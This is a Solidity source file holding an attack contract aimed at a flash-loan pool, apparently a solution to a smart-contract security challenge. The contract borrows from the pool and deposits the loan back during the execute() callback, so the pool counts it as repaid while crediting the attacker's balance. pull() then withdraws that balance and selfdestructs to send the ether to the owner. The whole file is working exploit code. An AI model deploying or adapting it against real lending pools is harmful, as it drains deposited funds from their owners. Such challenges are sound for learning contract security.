// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface sidePool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}


contract attack04_call {
    address private pool;
    address private owner;
    constructor (address _pool) payable {
        pool = _pool;
        owner = msg.sender;
    }

    function execute() public payable {
        (bool ok, ) = pool.call{ value: msg.value }(abi.encodeWithSignature("deposit()"));
        require(ok, "execute fail");
        // sidePool(pool).deposit{value: msg.value}();
    }

    function attack_dr(uint256 _amount) public {
        // (bool ok, ) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", _amount));
        // require(ok, "attack fail");
        sidePool(pool).flashLoan(_amount);
    }

    function pull() public {
        (bool ok, ) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "pull fail");
        // sidePool(pool).withdraw();
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}
